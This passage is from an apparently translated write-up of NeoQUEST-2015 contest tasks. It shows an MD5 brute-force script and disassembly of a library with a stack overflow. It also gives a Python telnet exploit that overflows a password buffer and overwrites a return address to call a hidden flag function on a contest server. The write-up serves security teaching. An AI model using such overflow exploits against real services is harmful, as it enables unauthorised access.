class="hljs-string">"bc7a6cff6c8507488e186d378ec12b38"</span></span>, <span class="hljs-string"><span class="hljs-string">"deaeb78d2c64a16cecd1a718e226db52"</span></span>, <span class="hljs-string"><span class="hljs-string">"c81e728d9d4c2f636f067f89cc14862c"</span></span>, <span class="hljs-string"><span class="hljs-string">"7742638106aea26564f3f6fa02fe1265"</span></span>, <span class="hljs-string"><span class="hljs-string">"7c8104aa5e88bee40658c61c5f869284"</span></span>, <span class="hljs-string"><span class="hljs-string">"71e157ffdf45f4946e95d0ac115466a1"</span></span> };</code> "138378fc00ad7d559f0418019e750b19", "39eb98f5edec84e35f52feff51c94a25", "3ff5db4ebc8437f338ce978fddcfb334", "e1cd7a2a000a2fe69f909a2e46dab073", "bf80eafce6f8d51220dd6603295852d5", "f8bc2fbe2c937ea5b5e8839cbea69491", "e8bb39c756ad2b46a80b3f07c8422037", "a3d4832c6cc0b51163e04301e6a17b55", "bc7a6cff6c8507488e186d378ec12b38", "deaeb78d2c64a16cecd1a718e226db52", "c81e728d9d4c2f636f067f89cc14862c <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hashes = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>[] { <span class="hljs-string"><span class="hljs-string">"dfa7b3505d612417911b86b89f869d6c"</span></span>, <span class="hljs-string"><span class="hljs-string">"73b6951965fda60be0c69da1411e59af"</span></span>, <span class="hljs-string"><span class="hljs-string">"4ad9eab6a9bd83eec4723d05444059e2"</span></span>, <span class="hljs-string"><span class="hljs-string">"4f60dca64aedd943e4fccb8bbf18e25c"</span></span>, <span class="hljs-string"><span class="hljs-string">"9ed2ac984ed7182a4974a4bab0ad8fcd"</span></span>, <span class="hljs-string"><span class="hljs-string">"826fc5d7998c16eeb77abc00702a00ab"</span></span>, <span class="hljs-string"><span class="hljs-string">"4ec559ee5a6249f0c69ab8ff9b804072"</span></span>, <span class="hljs-string"><span class="hljs-string">"0eebdd1e6d919d04cdee9646607786c3"</span></span>, <span class="hljs-string"><span class="hljs-string">"172cfbcb9d8de7425233fd7183f43c21"</span></span>, <span class="hljs-string"><span class="hljs-string">"7174ce70d0702083e26d285196d36cf2"</span></span>, <span class="hljs-string"><span class="hljs-string">"77526663ec282d1d1f62229ab980edd5"</span></span>, <span class="hljs-string"><span class="hljs-string">"c7f399fb9f981ba2445ba573ec668cef"</span></span>, <span class="hljs-string"><span class="hljs-string">"efa9d9d29367af2b3c1cc1494f882f2d"</span></span>, <span class="hljs-string"><span class="hljs-string">"01e5f7d323222fd161fcbd0b32f26b2b"</span></span>, <span class="hljs-string"><span class="hljs-string">"83daec0d569704618ecf60d19b031082"</span></span>, <span class="hljs-string"><span class="hljs-string">"a2c2c74263df7545cb857b69ce5820b2"</span></span>, <span class="hljs-string"><span class="hljs-string">"ac13be701bc79036602ae9f355e6c389"</span></span>, <span class="hljs-string"><span class="hljs-string">"d33bf0c58b48508c706d32c6e8a171d4"</span></span>, <span class="hljs-string"><span class="hljs-string">"138378fc00ad7d559f0418019e750b19"</span></span>, <span class="hljs-string"><span class="hljs-string">"39eb98f5edec84e35f52feff51c94a25"</span></span>, <span class="hljs-string"><span class="hljs-string">"3ff5db4ebc8437f338ce978fddcfb334"</span></span>, <span class="hljs-string"><span class="hljs-string">"e1cd7a2a000a2fe69f909a2e46dab073"</span></span>, <span class="hljs-string"><span class="hljs-string">"bf80eafce6f8d51220dd6603295852d5"</span></span>, <span class="hljs-string"><span class="hljs-string">"f8bc2fbe2c937ea5b5e8839cbea69491"</span></span>, <span class="hljs-string"><span class="hljs-string">"e8bb39c756ad2b46a80b3f07c8422037"</span></span>, <span class="hljs-string"><span class="hljs-string">"a3d4832c6cc0b51163e04301e6a17b55"</span></span>, <span class="hljs-string"><span class="hljs-string">"bc7a6cff6c8507488e186d378ec12b38"</span></span>, <span class="hljs-string"><span class="hljs-string">"deaeb78d2c64a16cecd1a718e226db52"</span></span>, <span class="hljs-string"><span class="hljs-string">"c81e728d9d4c2f636f067f89cc14862c"</span></span>, <span class="hljs-string"><span class="hljs-string">"7742638106aea26564f3f6fa02fe1265"</span></span>, <span class="hljs-string"><span class="hljs-string">"7c8104aa5e88bee40658c61c5f869284"</span></span>, <span class="hljs-string"><span class="hljs-string">"71e157ffdf45f4946e95d0ac115466a1"</span></span> };</code> </pre><br><br>  The Python 3 login program might look like this: <br><br><pre> <code class="hljs 1c">import hashlib hashes = ( 'dfa7b<span class="hljs-number"><span class="hljs-number">3505</span></span>d<span class="hljs-number"><span class="hljs-number">61241791</span></span>1b86b89f869d6c', '73b<span class="hljs-number"><span class="hljs-number">695196</span></span>5fda60be0c69da<span class="hljs-number"><span class="hljs-number">1411</span></span>e59af', '4ad9eab6a9bd83eec<span class="hljs-number"><span class="hljs-number">4723</span></span>d<span class="hljs-number"><span class="hljs-number">05444059</span></span>e2', '4f60dca64aedd943e4fccb8bbf18e25c', '9ed2ac984ed<span class="hljs-number"><span class="hljs-number">7182</span></span>a<span class="hljs-number"><span class="hljs-number">4974</span></span>a4bab0ad8fcd', '826fc5d<span class="hljs-number"><span class="hljs-number">7998</span></span>c16eeb77abc<span class="hljs-number"><span class="hljs-number">0070</span></span>2a00ab', '4ec559ee5a<span class="hljs-number"><span class="hljs-number">6249</span></span>f0c69ab8ff9b<span class="hljs-number"><span class="hljs-number">804072</span></span>', '0eebdd1e6d919d04cdee<span class="hljs-number"><span class="hljs-number">9646607786</span></span>c3', '172cfbcb9d8de<span class="hljs-number"><span class="hljs-number">742523</span></span>3fd<span class="hljs-number"><span class="hljs-number">7183</span></span>f43c21', '<span class="hljs-number"><span class="hljs-number">7174</span></span>ce70d<span class="hljs-number"><span class="hljs-number">070208</span></span>3e26d<span class="hljs-number"><span class="hljs-number">285196</span></span>d36cf2', '<span class="hljs-number"><span class="hljs-number">77526663</span></span>ec282d1d1f<span class="hljs-number"><span class="hljs-number">6222</span></span>9ab980edd5', 'c7f399fb9f981ba<span class="hljs-number"><span class="hljs-number">2445</span></span>ba573ec668cef', 'efa9d9d<span class="hljs-number"><span class="hljs-number">2936</span></span>7af2b3c1cc<span class="hljs-number"><span class="hljs-number">1494</span></span>f882f2d', '01e5f7d<span class="hljs-number"><span class="hljs-number">323222</span></span>fd161fcbd0b32f26b2b', '83daec0d<span class="hljs-number"><span class="hljs-number">56970461</span></span>8ecf60d19b<span class="hljs-number"><span class="hljs-number">031082</span></span>', 'a2c2c<span class="hljs-number"><span class="hljs-number">7426</span></span>3df<span class="hljs-number"><span class="hljs-number">7545</span></span>cb857b69ce<span class="hljs-number"><span class="hljs-number">5820</span></span>b2', 'ac13be701bc<span class="hljs-number"><span class="hljs-number">79036602</span></span>ae9f355e6c389', 'd33bf0c58b<span class="hljs-number"><span class="hljs-number">4850</span></span>8c706d32c6e8a171d4', '<span class="hljs-number"><span class="hljs-number">138378</span></span>fc00ad7d559f<span class="hljs-number"><span class="hljs-number">041801</span></span>9e750b19', '39eb98f5edec84e35f52feff51c94a25', '3ff5db4ebc<span class="hljs-number"><span class="hljs-number">8437</span></span>f338ce978fddcfb334', 'e1cd7a2a000a2fe69f909a2e46dab073', 'bf80eafce6f8d<span class="hljs-number"><span class="hljs-number">5122</span></span>0dd<span class="hljs-number"><span class="hljs-number">6603295852</span></span>d5', 'f8bc2fbe2c937ea5b5e<span class="hljs-number"><span class="hljs-number">8839</span></span>cbea<span class="hljs-number"><span class="hljs-number">6949</span></span>1', 'e8bb39c756ad2b46a80b3f07c<span class="hljs-number"><span class="hljs-number">842203</span></span>7', 'a3d<span class="hljs-number"><span class="hljs-number">4832</span></span>c6cc0b<span class="hljs-number"><span class="hljs-number">5116</span></span>3e<span class="hljs-number"><span class="hljs-number">0430</span></span>1e6a17b55', 'bc7a6cff6c<span class="hljs-number"><span class="hljs-number">850748</span></span>8e186d378ec12b38', 'deaeb78d2c64a16cecd1a718e226db52', 'c81e728d9d4c2f636f067f89cc<span class="hljs-number"><span class="hljs-number">1486</span></span>2c', '<span class="hljs-number"><span class="hljs-number">7742638106</span></span>aea<span class="hljs-number"><span class="hljs-number">2656</span></span>4f3f6fa02fe<span class="hljs-number"><span class="hljs-number">1265</span></span>', '7c<span class="hljs-number"><span class="hljs-number">8104</span></span>aa5e88bee<span class="hljs-number"><span class="hljs-number">4065</span></span>8c61c5f<span class="hljs-number"><span class="hljs-number">869284</span></span>', '71e157ffdf45f<span class="hljs-number"><span class="hljs-number">4946</span></span>e95d0ac<span class="hljs-number"><span class="hljs-number">115466</span></span>a1' ) login = '' chars = 'abcdef<span class="hljs-number"><span class="hljs-number">1234567890</span></span>' for i in range(<span class="hljs-number"><span class="hljs-number">32</span></span>): for j in range(len(chars)): hash = hashlib.md5((login + chars[j]).encode('utf-8')).hexdigest() if hash in hashes: login += chars[j] print(login)</code> </pre><br><br>  As a result, it will display the key: 2b638b6da52bfad2d99dbab4018237df. <br><br><h6>  <b>Part two</b> </h6><br>  After successful selection of the key in the first part (Appendix C #), the telnet console opens for us, with a suggestion to enter a password.  We also need the libtest.so library. <br><br><img src="https://habrastorage.org/files/143/fdb/8cb/143fdb8cbe614c509d93e5f56f6a3f25.jpg"><br><br>  It is much more convenient to use Putty (IP and port look in .NET Reflector) <br><br><pre> <code class="hljs kotlin"><span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.host = <span class="hljs-string"><span class="hljs-string">"79.175.2.85"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.port = <span class="hljs-number"><span class="hljs-number">0x1f90</span></span>;</code> </pre><br><br>  Disassemble libtest.so.  The first is the StartTest feature. <br><br><pre> <code class="hljs perl">public StartTest StartTest proc near s2= byte ptr -<span class="hljs-number"><span class="hljs-number">20</span></span>h <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> rbp mov rbp, rsp <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">sub</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rsp</span></span></span><span class="hljs-function">, 20</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">h</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">lea</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rdi</span></span></span><span class="hljs-function">, </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aHello</span></span></span><span class="hljs-function"> </span></span>; <span class="hljs-string"><span class="hljs-string">"\nHello!\n"</span></span> call _puts mov rax, cs:pGetFlag_ptr mov rdx, cs:GetFlag_ptr mov [rax], rdx lea rsi, modes ; <span class="hljs-string"><span class="hljs-string">"r"</span></span> lea rdi, aHomeSrvPass_tx ; <span class="hljs-string"><span class="hljs-string">"/home/srv/pass.txt"</span></span> call _fopen ‚Ä¶</code> </pre><br><br>  The code reads the file /home/srv/pass.txt and compares it with the string entered by the user.  If the passwords match, then the text from the /home/srv/flag2.txt file is displayed.  In any other case, the verification cycle is repeated. <br><br><pre> <code class="hljs sql">loc_DD4: ; seconds mov edi, 1 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _sleep lea rax, [rbp+s2] lea rdx, [rbp+s2] <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> rdx, <span class="hljs-number"><span class="hljs-number">10</span></span>h mov rsi, rax ; s2 mov rdi, rdx ; s1 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> _strcmp <span class="hljs-keyword"><span class="hljs-keyword">test</span></span> eax, eax jnz <span class="hljs-keyword"><span class="hljs-keyword">short</span></span> loc_D7A</code> </pre><br><br>  Obviously, when a user enters a password longer than 16 characters, the stack variable with the password read from the file will be overwritten: <br><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">mov</span></span> rax, cs:stdin_ptr mov rdx, [rax] ; <span class="hljs-attribute"><span class="hljs-attribute">stream</span></span> lea rax, [rbp+s2] mov esi, <span class="hljs-number"><span class="hljs-number">64h</span></span> ; <span class="hljs-attribute"><span class="hljs-attribute">n</span></span> mov rdi, rax ; <span class="hljs-attribute"><span class="hljs-attribute">s</span></span> call _fgets</code> </pre><br><br>  Original C structure: <br><br><pre> <code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">info</span></span></span><span class="hljs-class"> {</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> entered_pass[<span class="hljs-number"><span class="hljs-number">16</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> correct_pass[<span class="hljs-number"><span class="hljs-number">16</span></span>]; };</code> </pre><br><br>  To get the flag, it is enough to enter at the first request ‚Äúaaaaaaaaaaaaaaaaa‚Äù (17 characters) and 1 rewritten character at the second: <br><br><img src="https://habrastorage.org/files/47a/788/d34/47a788d3439a4984be62354288573179.jpg"><br><br>  Second flag: 3ed54ac12757f4c2b4fabd64d41de42d <br><br><h6>  <b>Part three</b> </h6><br>  To get the third key, go back to the listing libtest.so. <br>  The GetFlag function seems suspicious: <br><br><pre> <code class="hljs perl">public GetFlag GetFlag proc near <span class="hljs-keyword"><span class="hljs-keyword">s</span></span>= byte ptr -<span class="hljs-number"><span class="hljs-number">70</span></span>h stream= qword ptr -<span class="hljs-number"><span class="hljs-number">8</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> rbp mov rbp, rsp <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">sub</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rsp</span></span></span><span class="hljs-function">, 70</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">h</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">lea</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rsi</span></span></span><span class="hljs-function">, </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">modes</span></span></span><span class="hljs-function"> </span></span>; <span class="hljs-string"><span class="hljs-string">"r"</span></span> lea rdi, filename ; <span class="hljs-string"><span class="hljs-string">"/home/srv/flag3.txt"</span></span> call _fopen ‚Ä¶</code> </pre><br><br>  The code reads the file /home/srv/flag3.txt and displays it on the screen.  But the function is not called anywhere! <br>  From the second part, we know that the application is vulnerable to a stack overflow.  Let's try to write shellcode to call the GetFlag function. <br><br>  Fill in the entered_pass: <br><br><pre> <code class="hljs tex"><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>61<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00</code> </pre><br><br>  Fill in the correct_pass: <br><br><pre> <code class="hljs tex"><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>61<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00</code> </pre><br><br>  Next, you need to rewrite the return address so that the GetFlag function is executed. <br>  In order to determine the address of the GetFlag function, you will need to output backtrace, which is present as a hint if you enter a password longer than 16 characters. <br><br>  So, from the backtrace you can find out the StartTest address, and already relative to this function, calculate the GetFlag address.  Since the addresses change every time you start, you need to get the StartTest address on the fly and get the GetFlag address. <br><br>  The code to get the flag in Python 2.7 may look like this: <br><br><pre> <code class="hljs tex">import telnetlib import re tn = telnetlib.Telnet('79.175.2.85', 8080) read = tn.read_until(b"password: ").decode() print(read) tn.write(b'aaaaaaaaaaaaaaaaa<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">r</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span>') read = tn.read_until(b"password: ").decode() print(read) p = re.compile(r'<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">(</span></span></span></span>StartTest<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">+</span></span></span></span>0xd0<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">)</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">[</span></span></span></span>(.+?)<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">]</span></span></span></span>', re.MULTILINE | re.DOTALL) m = p.search(read) addr = (hex(int(m.group(1), 16) - 208 - 271))[2:] raddr = '' raddr += addr[10]; raddr += addr[11]; raddr += addr[8]; raddr += addr[9]; raddr += addr[6]; raddr += addr[7]; raddr += addr[4]; raddr += addr[5]; raddr += addr[2]; raddr += addr[3]; raddr += addr[0]; raddr += addr[1]; raddr = raddr.decode('hex') tn.write(b'<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>61<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>61<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00' + raddr + '<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">x</span></span></span></span>00<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">n</span></span></span></span>') read = tn.read_until(b"password: ").decode() print("") print(read)</code> </pre><br><br><img src="https://habrastorage.org/files/3f5/6fc/5d4/3f56fc5d49d34042a392caad630f86d5.jpg"><br><br>  Third Flag: 1946fcc08e026023fd53f935769c7f52 <br><br><h6>  <b>To be continued ...</b> </h6><br>  Further more!  Ahead is an analysis of the remaining tasks of NeoQUEST-2015, after which we will begin to lift the veil of secrecy over what awaits the guests at the July "confrontation"! </div><p>Source: <a href="https://habr.com/ru/post/258169/">https://habr.com/ru/post/258169/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../258157/index.html">Audio playback on Intel Edison via Bluetooth using the Advanced Audio Distribution Profile (A2DP)</a></li>
<li><a href="../258159/index.html">Install OpenCV 3.0.0-rc1 (using IPP and TBB) on Intel Edison Yocto. USB camera in OpenCV</a></li>
<li><a href="../258163/index.html">Using the Intel Edison board to change the color of the Orbotix Sphero ball when new tweets appear</a></li>
<li><a href="../258165/index.html">How we do landings</a></li>
<li><a href="../258167/index.html">Own context menu using JavaScript</a></li>
<li><a href="../258171/index.html">Secrets of the Madrid court. Part 2.5: Answers to readers' questions on the previous part</a></li>
<li><a href="../258173/index.html">Launch of the Virtual Private Cloud service</a></li>
<li><a href="../258175/index.html">Multicellular microprocessor, "macrocycles" for working with arrays</a></li>
<li><a href="../258177/index.html">Roskomnadzor and his plans</a></li>
<li><a href="../258179/index.html">Neo4j VS MySQL</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
